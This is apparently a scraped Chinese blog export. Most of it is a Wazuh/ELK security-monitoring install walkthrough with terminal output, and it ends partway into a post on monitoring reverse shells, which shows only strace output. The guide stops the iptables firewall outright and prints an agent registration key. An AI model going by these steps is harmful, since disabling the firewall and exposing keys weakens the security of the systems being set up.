-H &apos;Content-Type: application/json&apos; -d @- % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 15547 100 15547 0 0 16125 0 --:--:-- --:--:-- --:--:-- 40592&#123;&quot;acknowledged&quot;:true&#125;[root@localhost opt]# ls[root@localhost opt]# ls[root@localhost opt]# curl https://raw.githubusercontent.com/wazuh/wazuh-kibana-app/master/server/startup/integration_files/alert_sample.json | curl -XPUT &quot;http://localhost:9200/wazuh-alerts-&quot;`date +%Y.%m.%d`&quot;/wazuh/sample&quot; -H &apos;Content-Type: application/json&apos; -d @- % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed102 1432 102 1432 0 0 1567 0 --:--:-- --:--:-- --:--:-- 4937&#123;&quot;_index&quot;:&quot;wazuh-alerts-2017.08.22&quot;,&quot;_type&quot;:&quot;wazuh&quot;,&quot;_id&quot;:&quot;sample&quot;,&quot;_version&quot;:1,&quot;result&quot;:&quot;created&quot;,&quot;_shards&quot;:&#123;&quot;total&quot;:2,&quot;successful&quot;:1,&quot;failed&quot;:0&#125;,&quot;created&quot;:true&#125;[root@localhost opt]# [root@localhost opt]# It is recommended to edit the default configuration to improve the Elasticsearch performance. To do so, please see Elasticsearch tuning.https://documentation.wazuh.com/current/installation-guide/optional-configurations/elastic-tuning.html#elastic-tuning 安装Logstash Logstash is the tool that will collect, parse, and forward to Elasticsearch for indexing and storage all logs generated by Wazuh server. For more info please see Logstash.https://www.elastic.co/products/logstash 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859[root@localhost opt]# yum install logstash已加载插件：fastestmirror设置安装进程Loading mirror speeds from cached hostfile * base: mirrors.btte.net * extras: mirrors.tuna.tsinghua.edu.cn * updates: mirror.bit.edu.cn解决依赖关系--&gt; 执行事务检查---&gt; Package logstash.noarch 1:5.5.2-1 will be 安装--&gt; 完成依赖关系计算依赖关系解决================================================================================================================================================ 软件包 架构 版本 仓库 大小================================================================================================================================================正在安装: logstash noarch 1:5.5.2-1 elastic-5.x 90 M事务概要================================================================================================================================================Install 1 Package(s)总下载量：90 MInstalled size: 169 M确定吗？[y/N]：y下载软件包：logstash-5.5.2.rpm | 90 MB 33:26 运行 rpm_check_debug 执行事务测试事务测试成功执行事务 正在安装 : 1:logstash-5.5.2-1.noarch 1/1 Using provided startup.options file: /etc/logstash/startup.optionsSuccessfully created system startup script for Logstash Verifying : 1:logstash-5.5.2-1.noarch 1/1 已安装: logstash.noarch 1:5.5.2-1 完毕！[root@localhost opt]# curl -so /etc/logstash/conf.d/01-wazuh.conf https://raw.githubusercontent.com/wazuh/wazuh/2.0/extensions/logstash/01-wazuh.conf[root@localhost opt]# curl -so /etc/logstash/wazuh-elastic5-template.json https://raw.githubusercontent.com/wazuh/wazuh/2.0/extensions/elasticsearch/wazuh-elastic5-template.json[root@localhost opt]# /usr/share/logstash/bin/system-install Successfully created system startup script for Logstash[root@localhost opt]# chkconfig --add logstash在 logstash 服务中读取信息时出错：没有那个文件或目录[root@localhost opt]# ls /etc/init.d/auditd functions iptables killall netconsole postfix rsyslog single crond halt jexec mdmonitor netfs rdisc sandbox sshd elasticsearch ip6tables kdump messagebus network restorecond saslauthd udev-post [root@localhost opt]# /usr/share/logstash/bin/system-install /etc/logstash/startup.options sysvUsing provided startup.options file: /etc/logstash/startup.optionsManually creating startup for specified platform: sysvSuccessfully created system startup script for Logstash[root@localhost opt]# chkconfig --add logstash[root@localhost opt]# service logstash startlogstash started Setting up SSL for Filebeat and Logstash 因为Wazuh server和Elastic Stack server是分布式架构，要配置在Filebeat和Logstash之间配SSL加密。 1[root@localhost opt]# cp /etc/pki/tls/openssl.cnf custom_openssl.cnf vi custom_openssl.cnf找到[ v3_ca ]字段，然后在它下面添加一行elastic server的ip地址：12[ v3_ca ]subjectAltName = IP: 192.168.106.43 12345678[root@localhost opt]# openssl req -x509 -batch -nodes -days 3650 -newkey rsa:2048 -keyout /etc/logstash/logstash.key -out /etc/logstash/logstash.crt -config custom_openssl.cnfGenerating a 2048 bit RSA private key.................+++.....+++writing new private key to &apos;/etc/logstash/logstash.key&apos;-----[root@localhost opt]# rm custom_openssl.cnf rm：是否删除普通文件 &quot;custom_openssl.cnf&quot;？y 配置Logstash server，这时在服务器中应该有了/etc/logstash/logstash.crt 证书和 /etc/logstash/logstash.key秘钥。 12345678910111213141516171819202122vi /etc/logstash/conf.d/01-wazuh.conf把input &#123; beats &#123; port =&gt; 5000 codec =&gt; &quot;json_lines&quot;# ssl =&gt; true# ssl_certificate =&gt; &quot;/etc/logstash/logstash.crt&quot;# ssl_key =&gt; &quot;/etc/logstash/logstash.key&quot; &#125;&#125;改成input &#123; beats &#123; port =&gt; 5000 codec =&gt; &quot;json_lines&quot; ssl =&gt; true ssl_certificate =&gt; &quot;/etc/logstash/logstash.crt&quot; ssl_key =&gt; &quot;/etc/logstash/logstash.key&quot; &#125;&#125; 123重启logstash[root@localhost opt]# service logstash restartlogstash started 配置Filebeat 现在我们配置filebeat认证logstash服务器认证。使用scp命令必须两台服务器都安装openssh-clients，yum -y install openssh-clients要在两台服务器上分别执行。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475[root@localhost ~]# yum -y install openssh-clients已加载插件：fastestmirror设置安装进程Loading mirror speeds from cached hostfile * base: mirrors.aliyun.com * extras: mirrors.aliyun.com * updates: mirrors.aliyun.com解决依赖关系--&gt; 执行事务检查---&gt; Package openssh-clients.x86_64 0:5.3p1-122.el6 will be 安装--&gt; 处理依赖关系 openssh = 5.3p1-122.el6，它被软件包 openssh-clients-5.3p1-122.el6.x86_64 需要--&gt; 处理依赖关系 libedit.so.0()(64bit)，它被软件包 openssh-clients-5.3p1-122.el6.x86_64 需要--&gt; 执行事务检查---&gt; Package libedit.x86_64 0:2.11-4.20080712cvs.1.el6 will be 安装---&gt; Package openssh.x86_64 0:5.3p1-111.el6 will be 升级--&gt; 处理依赖关系 openssh = 5.3p1-111.el6，它被软件包 openssh-server-5.3p1-111.el6.x86_64 需要---&gt; Package openssh.x86_64 0:5.3p1-122.el6 will be an update--&gt; 执行事务检查---&gt; Package openssh-server.x86_64 0:5.3p1-111.el6 will be 升级---&gt; Package openssh-server.x86_64 0:5.3p1-122.el6 will be an update--&gt; 完成依赖关系计算依赖关系解决================================================================================================================================================ 软件包 架构 版本 仓库 大小================================================================================================================================================正在安装: openssh-clients x86_64 5.3p1-122.el6 base 443 k为依赖而安装: libedit x86_64 2.11-4.20080712cvs.1.el6 base 74 k为依赖而更新: openssh x86_64 5.3p1-122.el6 base 277 k openssh-server x86_64 5.3p1-122.el6 base 329 k事务概要================================================================================================================================================Install 2 Package(s)Upgrade 2 Package(s)总下载量：1.1 M下载软件包：(1/4): libedit-2.11-4.20080712cvs.1.el6.x86_64.rpm | 74 kB 00:00 (2/4): openssh-5.3p1-122.el6.x86_64.rpm | 277 kB 00:00 (3/4): openssh-clients-5.3p1-122.el6.x86_64.rpm | 443 kB 00:00 (4/4): openssh-server-5.3p1-122.el6.x86_64.rpm | 329 kB 00:00 ------------------------------------------------------------------------------------------------------------------------------------------------总计 414 kB/s | 1.1 MB 00:02 运行 rpm_check_debug 执行事务测试事务测试成功执行事务 正在升级 : openssh-5.3p1-122.el6.x86_64 1/6 正在安装 : libedit-2.11-4.20080712cvs.1.el6.x86_64 2/6 正在安装 : openssh-clients-5.3p1-122.el6.x86_64 3/6 正在升级 : openssh-server-5.3p1-122.el6.x86_64 4/6 清理 : openssh-server-5.3p1-111.el6.x86_64 5/6 清理 : openssh-5.3p1-111.el6.x86_64 6/6 Verifying : openssh-server-5.3p1-122.el6.x86_64 1/6 Verifying : libedit-2.11-4.20080712cvs.1.el6.x86_64 2/6 Verifying : openssh-5.3p1-122.el6.x86_64 3/6 Verifying : openssh-clients-5.3p1-122.el6.x86_64 4/6 Verifying : openssh-5.3p1-111.el6.x86_64 5/6 Verifying : openssh-server-5.3p1-111.el6.x86_64 6/6 已安装: openssh-clients.x86_64 0:5.3p1-122.el6 作为依赖被安装: libedit.x86_64 0:2.11-4.20080712cvs.1.el6 作为依赖被升级: openssh.x86_64 0:5.3p1-122.el6 openssh-server.x86_64 0:5.3p1-122.el6 完毕！ 以下内容在filebeat服务端，也就是wazuh server上执行。 123[root@localhost ~]# scp root@192.168.106.43:/etc/logstash/logstash.crt /etc/filebeatroot@192.168.106.43&apos;s password: logstash.crt vi /etc/filebeat/filebeat.yml1234567891011121314修改output: logstash: # The Logstash hosts hosts: [&quot;192.168.106.43:5000&quot;]# ssl:# certificate_authorities: [&quot;/etc/filebeat/logstash.crt&quot;]变成output: logstash: hosts: [&quot;192.168.106.43:5000&quot;] ssl: certificate_authorities: [&quot;/etc/filebeat/logstash.crt&quot;] 重新启动filebeat 123456789101112131415161718192021[root@localhost ~]# service filebeat restart2017/08/23 03:36:41.485699 beat.go:285: INFO Home path: [/usr/share/filebeat] Config path: [/etc/filebeat] Data path: [/var/lib/filebeat] Logs path: [/var/log/filebeat]2017/08/23 03:36:41.485822 beat.go:186: INFO Setup Beat: filebeat; Version: 5.5.12017/08/23 03:36:41.485956 metrics.go:23: INFO Metrics logging every 30s2017/08/23 03:36:41.488062 logstash.go:90: INFO Max Retries set to: 32017/08/23 03:36:41.488281 outputs.go:108: INFO Activated logstash as output plugin.2017/08/23 03:36:41.489904 publish.go:295: INFO Publisher name: localhost.localdomain2017/08/23 03:36:41.508442 async.go:63: INFO Flush Interval set to: 1s2017/08/23 03:36:41.508504 async.go:64: INFO Max Bulk Size set to: 2048Config OKStopping filebeat: [确定]Starting filebeat: 2017/08/23 03:36:41.654868 beat.go:285: INFO Home path: [/usr/share/filebeat] Config path: [/etc/filebeat] Data path: [/var/lib/filebeat] Logs path: [/var/log/filebeat]2017/08/23 03:36:41.654971 beat.go:186: INFO Setup Beat: filebeat; Version: 5.5.12017/08/23 03:36:41.655207 metrics.go:23: INFO Metrics logging every 30s2017/08/23 03:36:41.656127 logstash.go:90: INFO Max Retries set to: 32017/08/23 03:36:41.656311 outputs.go:108: INFO Activated logstash as output plugin.2017/08/23 03:36:41.656522 publish.go:295: INFO Publisher name: localhost.localdomain2017/08/23 03:36:41.657083 async.go:63: INFO Flush Interval set to: 1s2017/08/23 03:36:41.657125 async.go:64: INFO Max Bulk Size set to: 2048Config OK [确定] 安装Kibana12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849[root@localhost opt]# yum install kibana已加载插件：fastestmirror设置安装进程Loading mirror speeds from cached hostfile * base: mirror.bit.edu.cn * extras: mirror.bit.edu.cn * updates: mirror.bit.edu.cn解决依赖关系--&gt; 执行事务检查---&gt; Package kibana.x86_64 0:5.5.2-1 will be 安装--&gt; 完成依赖关系计算依赖关系解决================================================================================================================================================ 软件包 架构 版本 仓库 大小================================================================================================================================================正在安装: kibana x86_64 5.5.2-1 elastic-5.x 50 M事务概要================================================================================================================================================Install 1 Package(s)总下载量：50 MInstalled size: 191 M确定吗？[y/N]：y下载软件包：kibana-5.5.2-x86_64.rpm | 50 MB 16:47 运行 rpm_check_debug 执行事务测试事务测试成功执行事务 正在安装 : kibana-5.5.2-1.x86_64 1/1 Verifying : kibana-5.5.2-1.x86_64 1/1 已安装: kibana.x86_64 0:5.5.2-1 完毕！[root@localhost opt]# /usr/share/kibana/bin/kibana-plugin install https://packages.wazuh.com/wazuhapp/wazuhapp.zipAttempting to transfer from https://packages.wazuh.com/wazuhapp/wazuhapp.zipTransferring 24560704 bytes....................Transfer completeRetrieving metadata from plugin archiveExtracting plugin archiveExtraction completeOptimizing and caching browser bundles...Plugin installation complete vi /etc/kibana/kibana.yml12345把#server.host: &quot;localhost&quot;改成server.host: &quot;0.0.0.0&quot; It is recommended to set up an Nginx proxy for Kibana in order to use SSL encryption and to enable authentication. Instructions to set the proxy up can be found at Setting up SSL and authentication for Kibana.https://documentation.wazuh.com/current/installation-guide/optional-configurations/kibana_ssl.html#kibana-ssl 重启kibana123[root@localhost opt]# chkconfig --add kibana[root@localhost opt]# service kibana startkibana started 通过API连接Wazuh App通过192.168.106.43:5601访问 Kibana，无法访问，查看本地端口已经监听在0.0.0.0:5601，所以关闭防火墙。 12345678910111213141516171819202122232425262728293031[root@localhost opt]# netstat -ntlpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:5601 0.0.0.0:* LISTEN 27473/node tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 27360/sshd tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 5748/master tcp 0 0 ::ffff:127.0.0.1:9200 :::* LISTEN 26585/java tcp 0 0 ::1:9200 :::* LISTEN 26585/java tcp 0 0 ::ffff:127.0.0.1:9300 :::* LISTEN 26585/java tcp 0 0 ::1:9300 :::* LISTEN 26585/java tcp 0 0 :::22 :::* LISTEN 27360/sshd tcp 0 0 ::1:25 :::* LISTEN 5748/master [root@localhost opt]# iptables -LChain INPUT (policy ACCEPT)target prot opt source destination ACCEPT all -- anywhere anywhere state RELATED,ESTABLISHED ACCEPT icmp -- anywhere anywhere ACCEPT all -- anywhere anywhere ACCEPT tcp -- anywhere anywhere state NEW tcp dpt:ssh REJECT all -- anywhere anywhere reject-with icmp-host-prohibited Chain FORWARD (policy ACCEPT)target prot opt source destination REJECT all -- anywhere anywhere reject-with icmp-host-prohibited Chain OUTPUT (policy ACCEPT)target prot opt source destination [root@localhost opt]# service iptables stopiptables：将链设置为政策 ACCEPT：filter [确定]iptables：清除防火墙规则： [确定]iptables：正在卸载模块： [确定] 访问界面 点击”Wazuh”按钮 点击”ADD NEW API” 1234567891011121314Welcome to the Wazuh App for Kibana 5The Wazuh App brings together a new and useful web interface for managing and monitoring your Wazuh infrastructure. You can check agent status, alert evolution, most recent events, popular alerts, top alert groups, etc. You can also display configuration and logs of the manager.In addition, make use of any or all of these extensions:Linux Audit system integration.PCI DSS Compliance.OpenSCAP security compliance and vulnerability assessments.The app joins Wazuh features like: Log management and analysis, file integrity monitoring, intrusion and anomaly detection and policy and compliance monitoring.Help us to improve this app. We would appreciate your feedback. Collaborate with us on the Mailing Lists and/or the Wazuh App Github repositoryPlease enter your Wazuh RESTful API credentials at the form below to begin. 请看上面的介绍，Wazuh主要的功能特性和扩展。新版本在上方的导航将api、扩展、关于分3个页面。 添加api之前准备工作 在填用户名、密码、url、端口之前，要先到Wazuh server主机上，使用命令生成非默认的认证来保护Wazuh API。 1234567891011121314[root@localhost ~]# cd /var/ossec/api/configuration/auth/[root@localhost auth]# lshtpasswd user[root@localhost auth]# sudo node htpasswd -c user wazuh-apiNew password: Re-type new password: Adding password for user wazuh-api.[root@localhost auth]# ll总用量 4lrwxrwxrwx. 1 root root 49 8月 1 15:12 htpasswd -&gt; /var/ossec/api/node_modules/htpasswd/bin/htpasswd-rwxr-x---. 1 root root 48 8月 23 17:47 user[root@localhost auth]# service wazuh-api restartWAZUH-API stopped.WAZUH-API started. 可以先访问一下web，看认证是否成功 填入api字段-提示错误 官方的邮件列表解释了这个bug：https://groups.google.com/forum/#!msg/wazuh/kBVoD-X7xX4/vpDOHjKhCQAJ 解决v2.0的bug 12yum upgrade wazuh-manageryum upgrade wazuh-api 官方列表里的讨论在版本比对时逻辑有错误等，在新版本中修复，升级就可以了。 安装agent这个就很简单了：https://documentation.wazuh.com/current/installation-guide/installing-wazuh-agent/index.html 注册agentManager的server端 ssl认证 123456[root@localhost db]# openssl req -x509 -batch -nodes -days 365 -newkey rsa:2048 -keyout /var/ossec/etc/sslmanager.key -out /var/ossec/etc/sslmanager.certGenerating a 2048 bit RSA private key...............................+++.........+++writing new private key to &apos;/var/ossec/etc/sslmanager.key&apos;----- 开启ossec-authd服务 12345678[root@localhost db]# /var/ossec/bin/agent_control ossec-analysisd ossec-execd ossec-luac ossec-remoted syscheck_update clear_stats ossec-authd ossec-integratord ossec-maild ossec-reportd update_ruleset.py list_agents ossec-control ossec-logcollector ossec-makelists ossec-syscheckd util.sh manage_agents ossec-csyslogd ossec-logtest ossec-monitord rootcheck_control verify-agent-conf ossec-agentlessd ossec-dbd ossec-lua ossec-regex syscheck_control wazuh-modulesd [root@localhost db]# /var/ossec/bin/ossec-authd[root@localhost db]# agent-auth客户端 客户端注册服务端ip 123456789[root@localhost ~]# /var/ossec/bin/agent-auth -m 192.168.106.422017/08/28 14:54:58 agent-auth: INFO: Started (pid: 6235).WARN: No authentication password provided.INFO: Connected to 192.168.106.42:1515INFO: Using agent name as: localhost.localdomainINFO: Send request to manager. Waiting for reply.INFO: Received response with agent keyINFO: Valid key created. Finished.INFO: Connection closed. 查看是否成功 server 端 123[root@localhost db]# cat /var/ossec/etc/client.keys001 localhost.localdomain any 5e7168616c858ef0d9a8c1737359825e72c17bf3a9575ed9f696e4b30masaike[root@localhost db]# /var/ossec/bin/agent_control -l agent 端 12[root@localhost ~]# cat /var/ossec/etc/client.keys001 localhost.localdomain any 5e7168616c858ef0d9a8c1737359825e72c17bf3a9575ed9f696e4b30masaike 连接到服务端Manager /var/ossec/etc/ossec.conf 1234567891011121314把&lt;ossec_config&gt; &lt;client&gt; &lt;server-ip&gt;MANAGER_IP&lt;/server-ip&gt; &lt;config-profile&gt;centos, centos6&lt;/config-profile&gt; &lt;protocol&gt;udp&lt;/protocol&gt; &lt;/client&gt;改成&lt;ossec_config&gt; &lt;client&gt; &lt;server-ip&gt;192.168.106.42&lt;/server-ip&gt; &lt;config-profile&gt;centos, centos6&lt;/config-profile&gt; &lt;protocol&gt;udp&lt;/protocol&gt; &lt;/client&gt; 启动（重启）wazuh-agent 123[root@localhost ~]# service wazuh-agent startStarting OSSEC: 2017/08/28 15:19:09 ossec-agentd: INFO: Using notify time: 600 and max time to reconnect: 1800 [ OK ] 但是你会看到wazuh面板agents管理上，显示的连接过来的机器ip写的是any。因为/var/ossec/bin/ossec-authd默认启动后，将注册any为连接ip，在服务端kill掉ossec-authd进程，然后/var/ossec/bin/ossec-authd -i启动。在server端通过/var/ossec/bin/manage_agents，删除已经注册的agent；在agent端删除/var/ossec/etc/client.keys里的内容记录，重新/var/ossec/bin/agent-auth -m 192.168.106.42注册，重启agent。","tags":[{"name":"甲方安全","slug":"甲方安全","permalink":"http://pirogue.org/tags/甲方安全/"},{"name":"信息安全","slug":"信息安全","permalink":"http://pirogue.org/tags/信息安全/"},{"name":"安全监控","slug":"安全监控","permalink":"http://pirogue.org/tags/安全监控/"},{"name":"Wazuh","slug":"Wazuh","permalink":"http://pirogue.org/tags/Wazuh/"},{"name":"ELK","slug":"ELK","permalink":"http://pirogue.org/tags/ELK/"}]},{"title":"反弹shell监控","date":"2017-07-25T08:28:06.000Z","path":"2017/07/25/reverse-shell/","text":"一、跟踪系统调用1. strace bash test.shroot@Kali:~/pirogue/reverse_shell# strace bash test.sh execve(&quot;/bin/bash&quot;, [&quot;bash&quot;, &quot;test.sh&quot;], [/* 50 vars */]) = 0brk(NULL) = 0x7a2000access(&quot;/etc/ld.so.nohwcap&quot;, F_OK) = -1 ENOENT (No such file or directory)mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fcafdb87000access(&quot;/etc/ld.so.preload&quot;, R_OK) = -1 ENOENT (No such file or directory)open(&quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3fstat(3, &#123;st_mode=S_IFREG|0644, st_size=128554, ...&#125;) = 0mmap(NULL, 128554, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb67000close(3) = 0access(&quot;/etc/ld.so.nohwcap&quot;, F_OK) = -1 ENOENT (No such file or directory)open(&quot;/lib/x86_64-linux-gnu/libtinfo.so.5&quot;, O_RDONLY|O_CLOEXEC) = 3read(3, &quot;\\177ELF\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0&gt;\\0\\1\\0\\0\\0\\260\\315\\0\\0\\0\\0\\0\\0&quot;..., 832) = 832fstat(3, &#123;st_mode=S_IFREG|0644, st_size=170776, ...&#125;) = 0mmap(NULL, 2267936, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fcafd73d000mprotect(0x7fcafd762000, 2097152, PROT_NONE) = 0mmap(0x7fcafd962000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x25000) = 0x7fcafd962000close(3) = 0access(&quot;/etc/ld.so.nohwcap&quot;, F_OK) = -1 ENOENT (No such file or directory)open(&quot;/lib/x86_64-linux-gnu/libdl.so.2&quot;, O_RDONLY|O_CLOEXEC) = 3read(3, &quot;\\177ELF\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0&gt;\\0\\1\\0\\0\\0\\200\\r\\0\\0\\0\\0\\0\\0&quot;..., 832) = 832fstat(3, &#123;st_mode=S_IFREG|0644, st_size=14640, ...&#125;) = 0mmap(NULL, 2109680, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fcafd539000mprotect(0x7fcafd53c000, 2093056, PROT_NONE) = 0mmap(0x7fcafd73b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7fcafd73b000close(3) = 0access(&quot;/etc/ld.so.nohwcap&quot;, F_OK) = -1 ENOENT (No such file or directory)open(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3read(3, &quot;\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0&gt;\\0\\1\\0\\0\\0\\320\\3\\2\\0\\0\\0\\0\\0&quot;..., 832) = 832fstat(3, &#123;st_mode=S_IFREG|0755, st_size=1689360, ...&#125;) = 0mmap(NULL, 3795360, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fcafd19a000mprotect(0x7fcafd32f000, 2097152, PROT_NONE) = 0mmap(0x7fcafd52f000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x195000) = 0x7fcafd52f000mmap(0x7fcafd535000, 14752, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fcafd535000close(3) = 0mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fcafdb65000arch_prctl(ARCH_SET_FS, 0x7fcafdb65b40) = 0mprotect(0x7fcafd52f000, 16384, PROT_READ) = 0mprotect(0x7fcafd73b000, 4096, PROT_READ) = 0mprotect(0x7fcafd962000, 16384, PROT_READ) = 0mprotect(0x700000, 12288, PROT_READ) = 0mprotect(0x7fcafdb8a000, 4096, PROT_READ) = 0munmap(0x7fcafdb67000, 128554) = 0open(&quot;/dev/tty&quot;, O_RDWR|O_NONBLOCK) = 3close(3) = 0brk(NULL) = 0x7a2000brk(0x7a3000) = 0x7a3000open(&quot;/usr/lib/locale/locale-archive&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)brk(0x7a4000) = 0x7a4000open(&quot;/usr/share/locale/locale.alias&quot;, O_RDONLY|O_CLOEXEC) = 3fstat(3, &#123;st_mode=S_IFREG|0644, st_size=2995, ...&#125;) = 0brk(0x7a6000) = 0x7a6000read(3, &quot;# Locale name alias data base.\\n#&quot;..., 4096) = 2995brk(0x7a7000) = 0x7a7000brk(0x7a8000) = 0x7a8000read(3, &quot;&quot;, 4096) = 0close(3) = 0open(&quot;/usr/lib/locale/en_US.UTF-8/LC_IDENTIFICATION&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)open(&quot;/usr/lib/locale/en_US.utf8/LC_IDENTIFICATION&quot;, O_RDONLY|O_CLOEXEC) = 3fstat(3, &#123;st_mode=S_IFREG|0644, st_size=368, ...&#125;) = 0mmap(NULL, 368, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb86000close(3) = 0open(&quot;/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache&quot;, O_RDONLY) = 3fstat(3, &#123;st_mode=S_IFREG|0644, st_size=26258, ...&#125;) = 0mmap(NULL, 26258, PROT_READ, MAP_SHARED, 3, 0) = 0x7fcafdb7f000close(3) = 0open(&quot;/usr/lib/locale/en_US.UTF-8/LC_MEASUREMENT&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)open(&quot;/usr/lib/locale/en_US.utf8/LC_MEASUREMENT&quot;, O_RDONLY|O_CLOEXEC) = 3fstat(3, &#123;st_mode=S_IFREG|0644, st_size=23, ...&#125;) = 0mmap(NULL, 23, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb7e000close(3) = 0open(&quot;/usr/lib/locale/en_US.UTF-8/LC_TELEPHONE&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)open(&quot;/usr/lib/locale/en_US.utf8/LC_TELEPHONE&quot;, O_RDONLY|O_CLOEXEC) = 3fstat(3, &#123;st_mode=S_IFREG|0644, st_size=59, ...&#125;) = 0mmap(NULL, 59, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb7d000close(3) = 0open(&quot;/usr/lib/locale/en_US.UTF-8/LC_ADDRESS&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)open(&quot;/usr/lib/locale/en_US.utf8/LC_ADDRESS&quot;, O_RDONLY|O_CLOEXEC) = 3fstat(3, &#123;st_mode=S_IFREG|0644, st_size=167, ...&#125;) = 0mmap(NULL, 167, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb7c000close(3) = 0open(&quot;/usr/lib/locale/en_US.UTF-8/LC_NAME&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)open(&quot;/usr/lib/locale/en_US.utf8/LC_NAME&quot;, O_RDONLY|O_CLOEXEC) = 3fstat(3, &#123;st_mode=S_IFREG|0644, st_size=77, ...&#125;) = 0mmap(NULL, 77, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb7b000close(3) = 0open(&quot;/usr/lib/locale/en_US.UTF-8/LC_PAPER&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)open(&quot;/usr/lib/locale/en_US.utf8/LC_PAPER&quot;, O_RDONLY|O_CLOEXEC) = 3fstat(3, &#123;st_mode=S_IFREG|0644, st_size=34, ...&#125;) = 0mmap(NULL, 34, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb7a000close(3) = 0open(&quot;/usr/lib/locale/en_US.UTF-8/LC_MESSAGES&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)open(&quot;/usr/lib/locale/en_US.utf8/LC_MESSAGES&quot;, O_RDONLY|O_CLOEXEC) = 3fstat(3, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0close(3) = 0open(&quot;/usr/lib/locale/en_US.utf8/LC_MESSAGES/SYS_LC_MESSAGES&quot;, O_RDONLY|O_CLOEXEC) = 3fstat(3, &#123;st_mode=S_IFREG|0644, st_size=57, ...&#125;) = 0mmap(NULL, 57, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb79000close(3) = 0open(&quot;/usr/lib/locale/en_US.UTF-8/LC_MONETARY&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)open(&quot;/usr/lib/locale/en_US.utf8/LC_MONETARY&quot;, O_RDONLY|O_CLOEXEC) = 3fstat(3, &#123;st_mode=S_IFREG|0644, st_size=286, ...&#125;) = 0mmap(NULL, 286, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb78000close(3) = 0brk(0x7a9000) = 0x7a9000open(&quot;/usr/lib/locale/en_US.UTF-8/LC_COLLATE&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)open(&quot;/usr/lib/locale/en_US.utf8/LC_COLLATE&quot;, O_RDONLY|O_CLOEXEC) = 3fstat(3, &#123;st_mode=S_IFREG|0644, st_size=1244054, ...&#125;) = 0mmap(NULL, 1244054, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafda35000close(3) = 0open(&quot;/usr/lib/locale/en_US.UTF-8/LC_TIME&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)open(&quot;/usr/lib/locale/en_US.utf8/LC_TIME&quot;, O_RDONLY|O_CLOEXEC) = 3fstat(3, &#123;st_mode=S_IFREG|0644, st_size=2454, ...&#125;) = 0mmap(NULL, 2454, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb77000close(3) = 0brk(0x7aa000) = 0x7aa000open(&quot;/usr/lib/locale/en_US.UTF-8/LC_NUMERIC&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)open(&quot;/usr/lib/locale/en_US.utf8/LC_NUMERIC&quot;, O_RDONLY|O_CLOEXEC) = 3fstat(3, &#123;st_mode=S_IFREG|0644, st_size=54, ...&#125;) = 0mmap(NULL, 54, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb76000close(3) = 0open(&quot;/usr/lib/locale/en_US.UTF-8/LC_CTYPE&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)open(&quot;/usr/lib/locale/en_US.utf8/LC_CTYPE&quot;, O_RDONLY|O_CLOEXEC) = 3fstat(3, &#123;st_mode=S_IFREG|0644, st_size=328180, ...&#125;) = 0mmap(NULL, 328180, PROT_READ, MAP_PRIVATE, 3, 0) = 